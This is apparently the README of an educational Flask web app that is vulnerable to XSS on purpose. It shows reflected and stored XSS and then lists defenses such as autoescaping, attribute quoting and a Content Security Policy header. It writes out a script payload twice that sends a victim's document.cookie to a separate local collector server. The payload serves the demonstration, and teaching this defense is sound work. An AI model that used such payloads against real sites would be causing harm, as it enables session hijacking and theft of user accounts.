# xss-demo
Minimal, flask-powered python web app to demonstrate reflected and stored XSS attacks.
Less than 30 lines of Python + 40 lines HTML template.

![XSS Demo Screenshot](xss-demo-screenshot.png "XSS Demo Screenshot")

# Disclaimer

The current version is vulnerable to XSS.
This is meant for educational purposed only, please do not use it to attack websites.

# Quickstart

* Clone this repository.
* Create a [virtual environment](https://virtualenvwrapper.readthedocs.io/) (if you don't want to install `flask` in your global python environment) and 
  activate it.
* `pip install flask`
* Run `FLASK_ENV=development flask run` in the vulnerable website folder
* Run `python app.py` in the malicious website folder
* Open [127.0.0.1:5000](http://127.0.0.1:5000/) in your webbrowser.
* Go to [127.0.0.1:5000](http://127.0.0.1:5000/cookie) to create set a cookie
* Go to [127.0.0.1:5000](http://127.0.0.1:5000/) and have fun with XSS

As you started the flask app in development mode, any source changes should apply immediately so you can just refresh
the page. If you want to clear the database, just delete the `database.db` file that is (re-)created on first use.

# Demostration for reflected XSS
* Key in `<script type=“text/javascript”>document.location=“http://127.0.0.1:1000/?c=“+document.cookie;</script>` into the query blank
* Notice that the code is reflected inside the addressbar as a query.
* When the user clicks on the link containing the address, their cookies from the vulnerable website can be stolen

# Demostration for Stored XSS
* Key in `<script type=“text/javascript”>document.location=“http://127.0.0.1:1000/?c=“+document.cookie;</script>` into the comment blank
* Notice that the code is stored within the website
* When the user access the website, their cookies will automatically stolen until the comment is removed

As you started the flask app in development mode, any source changes should apply immediately so you can just refresh
the page. If you want to clear the database, just delete the `database.db` file that is (re-)created on first use.

# Protection mechanisms

Of course you should never deactivate autoescaping in jinja/flask, so you should never have 
`{% autoescape false %}` in your production templates. This way you will always get the 
[standard HTML context filtering](https://flask.palletsprojects.com/en/1.1.x/templating/#controlling-autoescaping)
for variables in your templates.

The tooltip attack mentioned above can of course be avoided by using quotes correctly on 
[line 33 ](https://github.com/bgres/xss-demo/blob/master/templates/index.html#L33):
```html
      <div title="{{ comment }}">
```

You can also test using 
[Content Security Policy headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) to 
disallow unsafe inline javascript by replacing 
[`app.py` line 16-18](https://github.com/bgres/xss-demo/blob/master/app.py#L16-L18) with:

```python
    from flask import make_response
    r = make_response(render_template('index.html',
                      comments=comments,
                      search_query=search_query))
    r.headers.set('Content-Security-Policy', "script-src 'none'")
    return r
```


# Acknowledgements

This was forked from [bgres/xss-demo](https://github.com/bgres/xss-demo) 
The reflected server is made using a simple flask script